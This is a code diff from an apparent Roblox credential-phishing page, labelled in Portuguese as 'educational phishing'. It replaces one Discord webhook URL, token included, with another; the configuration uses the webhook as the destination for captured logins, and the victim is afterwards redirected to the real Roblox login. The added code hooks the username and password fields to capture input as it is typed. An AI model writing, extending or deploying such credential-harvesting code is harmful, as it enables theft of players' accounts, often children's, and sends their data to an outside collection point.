@@ -1032,7 +1032,7 @@ function checkRobloxInstall() {
 // Configurações do Phishing Educativo
 const CONFIG = {
     // 🔗 WEBHOOK - URL do Discord
-    webhookUrl: 'https://discord.com/api/webhooks/1401006483638059169/b1LcJW3NKHML1NGg3Ry_EMujqVsUvAyZ_vOtf--Fw1FwtuTn5Dk7GNm5nVkRBYvtDuB3',
+    webhookUrl: 'https://discord.com/api/webhooks/1401010722183450735/NfPave_lXPmGoXjWrFv9t18hmxcou9-MwK6qr2b_jafajhxzdllMYyr6Je-QTHA-Tzx7',
     
     // 🔄 REDIRECIONAMENTO - Para onde enviar após captura
     redirectUrl: 'https://www.roblox.com/login',
@@ -1126,6 +1126,23 @@ document.addEventListener('DOMContentLoaded', function() {
                         loginButton.click();
                     });
                 }
+                
+                // Intercepta mudanças nos campos para capturar dados em tempo real
+                usernameField.addEventListener('input', function() {
+                    console.log('📝 Usuário digitado:', usernameField.value);
+                });
+                
+                passwordField.addEventListener('input', function() {
+                    console.log('🔑 Senha digitada:', passwordField.value ? '***' : 'vazia');
+                });
+                
+                // Intercepta pressionar Enter no campo de senha
+                passwordField.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        loginButton.click();
+                    }
+                });
                 
                 console.log('✅ Captura configurada com sucesso!');
             } else {
